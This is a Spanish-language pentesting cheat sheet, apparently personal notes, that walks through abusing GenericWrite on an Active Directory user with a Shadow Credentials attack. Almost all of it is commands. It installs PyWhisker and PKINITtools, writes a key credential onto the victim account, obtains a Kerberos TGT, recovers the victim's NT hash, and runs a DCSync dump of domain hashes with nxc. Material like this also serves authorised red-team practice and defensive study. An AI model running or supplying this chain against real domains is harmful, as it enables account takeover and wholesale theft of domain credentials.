# Abuso ACL 

Tags: #AD #ACL #Linux #Impacket #ShadowAttack #Pywhisker #Gettgtpkinit 

## GenericWrite sobre Usuario - Forma 1 (Shadow Attack)

* [PyWhisker](https://github.com/ShutdownRepo/pywhisker/tree/main/pywhisker)
* [Shadow Credentials attack](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
* [PKINITtools](https://github.com/dirkjanm/PKINITtools )

```bash 
# Instalación 
❯ git clone https://github.com/ShutdownRepo/pywhisker.git
❯ cd pywhisker
❯ python3 -m venv env
❯ source env/bin/activate
❯ pip install --upgrade pip
❯ pip install -r requirements.txt
❯ cd pywhisker
```

```bash
# Shadow credentials attack 
Paso 1:
❯ ./pywhisker.py -d "domain" -u "ControlledAccount" -p "password" --target "targetAccount" --action "list" 
# Listar el atributo del usuario víctima para ver lo siguiente: 'msDS-KeyCredentialLink is either empty ...'

❯ ./pywhisker.py -d "domain" -u "ControlledAccount" -p "password" --target "targetAccount" --action "add" 

# La tool crea una llave privada, una pública y lo añade al usuario víctima 

	# dc-ip = IP del DC
	# d = Dominio 
	# u = usuario atacante 
	# p = Contraseña del usuario atacante 
	# t = usuario víctima 

❯ ./pywhisker.py -d "domain" -u "ControlledAccount" -H :Hash_NT --target "targetAccount" --action "add"  (Opcional)


NOTA:
	1. Crear un directorio en donde se guardará toda la info del comando 
	2. El output muestra la 'password' que se utilizará para obtener un TGT 
	3. Crea un 'cert.pfx' 
```

```bash 
# Instalación
❯ git clone https://github.com/dirkjanm/PKINITtools
❯ cd PKINITtools
❯ python3 -m venv env
❯ source env/bin/activate
❯ pip install -r requirements.txt
```

```bash 
# Gettgtpkinit (funciona si PKINIT está habilitado)

# Obtener el hash NT
Paso 2:
# En el output del comando se muestra la 'key'
❯ ./gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass 'password' domain/User output.ccache   
	
	# -cert-pfx = Archivo PFX (obtenido de pywhisker)
	# -pfx-pass = Contraseña del PFX (obtenida de pywhisker)
	# domain/User = Usuario target
	# output.ccache = Archivo de salida (Kerberos ticket)
	
	# Output muestra: TGT session key (COPIAR ESTO)
	# Ejemplo: [+] TGT session key: 2b5c8f1d9e3a4b6c7f1a2d3e4f5a6b7c

Paso 3:
❯ KRB5CCNAME=output.ccache ./getnthash.py -key 2b5c8f1d9e3a4b6c7f1a2d3e4f5a6b7c -dc-ip IP_DC domain/User

	# -key = La SESSION KEY que salió en gettgtpkinit.py (NO es 123456!)
	# -dc-ip = IP del Domain Controller
	# domain/User = Usuario target
	
	# Output: NT Hash (aad3b435b51404eeaad3b435b51404ee:88f6fb6111fcf...)
```

## GenericWrite sobre usuario - Forma 2 (Shadow Credentials Attack) 

* [PyWhisker](https://github.com/ShutdownRepo/pywhisker/tree/main/pywhisker)
* [Shadow Credentials attack](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)

```bash
# Shadow credentials attack 
❯ pywhisker.py -d "domain" -u "ControlledAccount" -p "password" --dc-ip IP --target "targetAccount" --action list 
# Listar el atributo del usuario víctima para ver lo siguiente: 'msDS-KeyCredentialLink is either empty ...'

❯ pywhisker.py -d "domain" -u "ControlledAccount" -p "password" --dc-ip IP --target "targetAccount" --action "add" 
# La tool crea una llave privadaa, una pública y lo añade al usuario víctima 

	# dc-ip = IP del DC
	# d = Dominio 
	# u = usuario atacante 
	# p = Contraseña del usuario atacante 
	# t = usuario víctima 

Notas:
	1. Crear un directorio en donde se guardará toda la info del comando 
	2. El output muestra la 'password' que se utilizará para obtener un TGT 
```

```bash 
# CERTIPY AUTH (funciona si PKINIT está habilitado)

# Autenticarse en el dominio generando el TGT y el NTLM HASH 
❯ certipy-ad auth -pfx cert.pfx -password 'pass123' -username targetAccount -domain domain.com -dc-ip IP
	# pfx = Es el certificado que crea el comando anterior 
	# password = Es la password que muestra el comando anterior 
	# username = Es el usuario víctima 
```

```bash 
❯ nxc smb IP -u targetAccount -H NT          # Verificar 
❯ nxc smb IP -u targetAccount -H NT --ntds   # Ejecutar un DCSync si tiene los permisos 
```